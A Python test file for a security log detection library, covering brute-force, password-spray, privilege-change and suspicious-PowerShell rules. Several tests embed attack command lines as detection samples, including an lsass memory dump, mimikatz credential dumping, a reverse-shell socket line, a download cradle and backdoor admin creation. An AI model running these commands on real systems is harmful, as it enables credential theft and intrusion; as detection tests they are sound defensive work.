import base64
import hashlib
from datetime import datetime
from pathlib import Path

from trace_verified.detection import DetectionConfig, decode_powershell_encoded, detect
from trace_verified.ingestion import ingest_file
from trace_verified.schemas import CanonicalEvent, Severity


def event(index, *, time="2026-02-01T00:00:00+00:00", user="alice", host="srv-1", kind="4625",
          ip="198.51.100.8", process=None, command=None, **raw):
    timestamp = datetime.fromisoformat(time)
    event_id = f"event-{index}"
    return CanonicalEvent(event_id, hashlib.sha256(str(raw).encode()).hexdigest(), timestamp,
        user.casefold() if user else None, host.casefold() if host else None, kind, "test.jsonl",
        dict(raw), process=process, command_line=command, source_ip=ip)


def auth_failures(count, *, user="alice", ip="198.51.100.8", host="srv-1", start=0):
    return [event(f"f{start+i}", time=f"2026-02-01T00:00:{i:02d}+00:00", user=user,
                  host=host, kind="4625", ip=ip, Status="0xC000006A", SubStatus="0xC000006A")
            for i in range(count)]


def rules(report):
    return {finding.rule_id for finding in report.findings}


def test_brute_force_threshold_and_mistyped_password_hard_negative():
    report = detect(auth_failures(5))
    assert "auth.brute_force" in rules(report)
    finding = next(item for item in report.findings if item.rule_id == "auth.brute_force")
    assert any("bad_password" in line for line in finding.rationale)
    report = detect(auth_failures(1))
    assert "auth.brute_force" not in rules(report)
    assert not report.findings


def test_spray_detects_multiple_accounts_without_merging_small_shared_ip_group():
    spray = [event(f"s{i}", user=f"user{i}", kind="4625", ip="203.0.113.2") for i in range(5)]
    assert "auth.password_spray" in rules(detect(spray))
    shared = [event(f"n{i}", user=f"staff{i}", kind="4625", ip="203.0.113.2") for i in range(4)]
    assert "auth.password_spray" not in rules(detect(shared))
    assert "auth.brute_force" not in rules(detect(shared))


def test_spray_retains_all_accounts_in_the_maximal_qualifying_window():
    rows = [event(f"spray-{i}", user=f"account-{i}", kind="4625", ip="203.0.113.70")
            for i in range(15)]
    report = detect(rows)
    findings = [finding for finding in report.findings if finding.rule_id == "auth.password_spray"]
    assert len(findings) == 1
    assert len(findings[0].targeted_users) == 15
    assert len(findings[0].supporting_event_ids) == 15


def test_placeholder_source_ips_do_not_create_password_spray_findings():
    rows = [event(f"placeholder-spray-{i}", user=f"account-{i}", kind="4625", ip=placeholder,
                  host="shared-server")
            for i, placeholder in enumerate(("-", "0.0.0.0", "127.0.0.1", "::1", "  "))]
    report = detect(rows)
    assert "auth.password_spray" not in rules(report)


def test_success_after_failures_preserves_chronology_and_requires_context():
    rows = auth_failures(5) + [event("success", time="2026-02-01T00:01:00+00:00", kind="4624")]
    report = detect(list(reversed(rows)))
    finding = next(item for item in report.findings if item.rule_id == "auth.success_after_failures")
    by_id = {item.event_id: item.timestamp for item in rows}
    times = [by_id[item] for item in finding.supporting_event_ids]
    assert times == sorted(times)
    no_context = [event(f"x{i}", kind="4625", ip=None) for i in range(5)] + [event("x-success", kind="4624", ip=None)]
    report = detect(no_context)
    assert "auth.success_after_failures" not in rules(report)
    coverage = next(row for row in report.coverage if row.detector_id == "success_after_failures")
    assert not coverage.executed and "IP alone" in coverage.reason


def test_auth_window_boundary_and_out_of_order_events():
    rows = [event("edge0", time="2026-02-01T00:00:00+00:00"),
            event("edge1", time="2026-02-01T00:10:00+00:00"),
            event("edge2", time="2026-02-01T00:10:00+00:00"),
            event("edge3", time="2026-02-01T00:10:00+00:00"),
            event("edge4", time="2026-02-01T00:10:00+00:00")]
    assert "auth.brute_force" in rules(detect(list(reversed(rows))))
    later = [event(f"later{i}", time=f"2026-02-01T00:00:{i:02d}+00:00") for i in range(4)]
    later.append(event("later4", time="2026-02-01T00:10:01+00:00"))
    assert "auth.brute_force" not in rules(detect(later))


def test_success_events_and_duplicate_references_do_not_count_as_failures():
    success = [event(str(i), kind="4624") for i in range(8)]
    assert "auth.brute_force" not in rules(detect(success))
    fails = auth_failures(4)
    assert "auth.brute_force" not in rules(detect(fails + [fails[0]] * 5))


def test_privilege_addition_has_exact_evidence_and_expected_actor_allowlist():
    change = event("group-add", kind="4728", user="operator", GroupName="Domain Admins", MemberName="user7")
    finding = next(item for item in detect([change]).findings if item.rule_id == "privilege.change")
    assert finding.supporting_event_ids == ["event-group-add"]
    assert any("Domain Admins" in line for line in finding.rationale)
    assert "unauthorized" in finding.description
    expected = event("admin-change", kind="4732", user="approved-admin", GroupName="Local Admins")
    report = detect([expected], DetectionConfig(expected_privilege_actors=frozenset({"approved-admin"})))
    assert "privilege.change" not in rules(report)


def test_windows_4672_is_not_a_privilege_change_or_scored_finding():
    fixture = Path(__file__).parent / "fixtures" / "windows_privilege_events.jsonl"
    events, _ = ingest_file(fixture)
    report = detect(events[:2])
    assert not any(finding.rule_id.startswith("privilege.") for finding in report.findings)
    assert report.findings == []


def test_windows_privilege_actor_is_subject_user_not_target_group():
    fixture = Path(__file__).parent / "fixtures" / "windows_privilege_events.jsonl"
    events, _ = ingest_file(fixture)
    changes = detect(events[2:])
    addition = next(item for item in changes.findings if item.rule_id == "privilege.change")
    removal = next(item for item in changes.findings if item.rule_id == "privilege.removal")
    assert addition.user == r"contoso\adminuser"
    assert removal.user == r"contoso\adminuser"
    assert any("Domain Admins" in rationale for rationale in addition.rationale)
    assert events[2].user is None
    assert events[2].actor == r"contoso\adminuser"
    assert events[2].target_group == "Domain Admins"
    assert events[2].target_member == r"CONTOSO\NewUser"
    expected = detect(events[2:3], DetectionConfig(expected_privilege_actors=frozenset({r"CONTOSO\AdminUser"})))
    assert not any(item.rule_id == "privilege.change" for item in expected.findings)


def test_privilege_detector_does_not_infer_change_without_event_evidence():
    ordinary = event("ordinary", kind="logon", user="operator")
    report = detect([ordinary])
    assert not any(item.detector_id == "privilege" for item in report.findings)
    coverage = next(row for row in report.coverage if row.detector_id == "privilege_changes")
    assert not coverage.executed and "may not include" in coverage.reason


def test_suspicious_process_detects_and_separately_decodes_powershell():
    command = "Write-Output 'harmless text' IEX (New-Object Net.WebClient).DownloadString('x')"
    encoded = base64.b64encode(command.encode("utf-16le")).decode("ascii")
    original = f"powershell.exe -NoProfile -EncodedCommand {encoded}"
    process_event = event("proc", kind="process_start", process="powershell.exe", command=original)
    finding = next(item for item in detect([process_event]).findings if item.rule_id == "process.suspicious")
    assert finding.original_command_line == original
    assert finding.decoded_command_line == command
    assert finding.decode_status == "decoded"


def test_benign_encoded_command_scheduled_task_and_safe_decode_failures():
    benign = base64.b64encode("Write-Output 'inventory complete'".encode("utf-16le")).decode()
    event1 = event("benign", kind="process_start", process="powershell.exe", command=f"powershell -EncodedCommand {benign}")
    task = event("task", kind="process_start", process="powershell.exe", command=r"powershell -NoProfile -File C:\Tasks\Inventory.ps1")
    benign_findings = detect([event1, task]).findings
    assert len(benign_findings) == 1
    benign_finding = benign_findings[0]
    assert benign_finding.severity_contribution == Severity.LOW
    assert benign_finding.decode_status == "decoded"
    assert benign_finding.decoded_command_line == "Write-Output 'inventory complete'"
    assert any("Decoded command" in line for line in benign_finding.rationale)
    assert "no configured suspicious-content rule matched" in benign_finding.description.casefold()
    assert decode_powershell_encoded("###")[1] == "malformed_base64"
    assert decode_powershell_encoded("A" * 100, max_chars=20)[1] == "oversized"
    malformed = event("badenc", kind="process_start", process="powershell.exe", command="powershell -EncodedCommand ###")
    finding = next(item for item in detect([malformed]).findings if item.rule_id == "process.suspicious")
    assert finding.original_command_line.endswith("###")
    assert finding.decoded_command_line is None
    assert finding.severity_contribution != Severity.HIGH


def _encoded_command(text, switch="-EncodedCommand"):
    encoded = base64.b64encode(text.encode("utf-16le")).decode("ascii")
    return encoded


def test_encoded_local_admin_creation_credential_dump_and_reverse_shell_are_detected():
    payloads = [
        "net user reviewadmin P@ssw0rd! /add & net localgroup administrators reviewadmin /add",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 1234 C:\\Temp\\lsass.dmp full",
        "$client = New-Object Net.Sockets.TCPClient('192.0.2.12', 4444)",
    ]
    expected_rules = ["windows_local_admin_creation", "credential_dumping", "reverse_shell"]
    for index, (payload, expected_rule) in enumerate(zip(payloads, expected_rules)):
        encoded = _encoded_command(payload)
        process_event = event(f"encoded-{index}", kind="process_start", process="powershell.exe",
                              command=f"powershell.exe -EncodedCommand {encoded}")
        finding = next(item for item in detect([process_event]).findings if item.rule_id == "process.suspicious")
        assert finding.decode_status == "decoded"
        assert finding.decoded_command_line == payload
        assert finding.severity_contribution == Severity.HIGH
        assert any(expected_rule in line for line in finding.rationale)


def test_abbreviated_encoded_command_flags_work_for_powershell_and_cmd_invocation():
    payload = "net user reviewadmin P@ssw0rd! /add & net localgroup administrators reviewadmin /add"
    encoded = _encoded_command(payload)
    invocations = [
        ("powershell.exe", f"powershell.exe -e {encoded}"),
        ("powershell.exe", f"powershell.exe -ec {encoded}"),
        ("powershell.exe", f"powershell.exe -enco {encoded}"),
        ("cmd.exe", f"cmd /c powershell.exe -ec {encoded}"),
    ]
    for index, (process, command) in enumerate(invocations):
        process_event = event(f"abbreviated-{index}", kind="process_start", process=process, command=command)
        finding = next(item for item in detect([process_event]).findings if item.rule_id == "process.suspicious")
        assert finding.decode_status == "decoded"
        assert finding.decoded_command_line == payload
        assert "windows_local_admin_creation" in " ".join(finding.rationale)


def test_unrelated_execution_policy_flag_is_not_treated_as_encoded_command():
    process_event = event("execution-policy", kind="process_start", process="powershell.exe",
                          command="powershell.exe -ExecutionPolicy Bypass -File C:\\Tasks\\Job.ps1")
    assert not detect([process_event]).findings


def test_encoded_switches_are_only_parsed_after_a_real_powershell_invocation():
    benign = [
        event("cmd-env", kind="process_start", process="cmd.exe", command="cmd.exe /e:on /c dir"),
        event("explorer-env", kind="process_start", process="explorer.exe", command="explorer.exe /e"),
        event("netstat-env", kind="process_start", process="netstat.exe", command="netstat -e"),
        event("grep-env", kind="process_start", process="grep.exe", command="grep -e error app.log"),
    ]
    assert not detect(benign).findings

    payload = base64.b64encode("Write-Output 'inventory complete'".encode("utf-16le")).decode()
    actual = [
        event("ps-e", kind="process_start", process="powershell.exe", command=f"powershell.exe -e {payload}"),
        event("cmd-ps-ec", kind="process_start", process="cmd.exe", command=f"cmd.exe /c powershell.exe -ec {payload}"),
    ]
    findings = detect(actual).findings
    assert len(findings) == 2
    assert all(finding.decode_status == "decoded" for finding in findings)
    assert all(finding.severity_contribution == Severity.LOW for finding in findings)


def test_cleartext_and_encoded_high_impact_patterns_have_consistent_severity():
    payloads = [
        ("credential_dumping", "mimikatz.exe sekurlsa::logonpasswords", "mimikatz.exe sekurlsa::logonpasswords"),
        ("reverse_shell", "$client = New-Object Net.Sockets.TCPClient('192.0.2.12', 4444)",
         "$client = New-Object Net.Sockets.TCPClient('192.0.2.12', 4444)"),
        ("windows_local_admin_creation", "net localgroup administrators reviewadmin /add",
         "net localgroup administrators reviewadmin /add"),
        ("powershell_download_cradle", "Invoke-WebRequest http://example.invalid/a",
         "Invoke-WebRequest http://example.invalid/a"),
    ]
    for index, (expected_rule, cleartext, encoded_text) in enumerate(payloads):
        direct = event(f"direct-high-{index}", kind="process_start", process="powershell.exe", command=cleartext)
        direct_finding = next(item for item in detect([direct]).findings if item.rule_id == "process.suspicious")
        encoded = base64.b64encode(encoded_text.encode("utf-16le")).decode()
        encoded_event = event(f"encoded-high-{index}", kind="process_start", process="powershell.exe",
                              command=f"powershell.exe -EncodedCommand {encoded}")
        encoded_finding = next(item for item in detect([encoded_event]).findings if item.rule_id == "process.suspicious")
        assert expected_rule in " ".join(direct_finding.rationale)
        assert expected_rule in " ".join(encoded_finding.rationale)
        assert direct_finding.severity_contribution == encoded_finding.severity_contribution == Severity.HIGH

    unrelated = event("medium-pattern", kind="process_start", process="rundll32.exe", command="rundll32.exe benign.dll,Entry")
    assert next(item for item in detect([unrelated]).findings if item.rule_id == "process.suspicious").severity_contribution == Severity.MEDIUM


def test_detector_coverage_exposes_missing_required_fields():
    missing = event("missing", time="2026-02-01T00:00:00+00:00", user=None, host=None, kind=None,
                    ip=None, process=None, command=None)
    report = detect([missing])
    assert not report.findings
    assert all(not item.executed for item in report.coverage)
    assert all(item.reason for item in report.coverage)


def test_windows_timecreated_logons_flow_through_ingestion_into_brute_force_detection():
    fixture = Path(__file__).parent / "fixtures" / "windows_timecreated.jsonl"
    events, ingestion = ingest_file(fixture)

    report = detect(events)

    assert len(events) == 5
    assert ingestion.accepted_rows == 5
    assert all(event.timestamp is not None for event in events)
    assert all(event.event_type == "4625" for event in events)
    assert all(event.user == r"contoso\alice" for event in events)
    assert all(event.host == "dc-01.contoso.local" for event in events)
    assert all(event.source_ip == "192.0.2.44" for event in events)
    finding = next(item for item in report.findings if item.rule_id == "auth.brute_force")
    assert set(finding.supporting_event_ids) == {event.event_id for event in events}
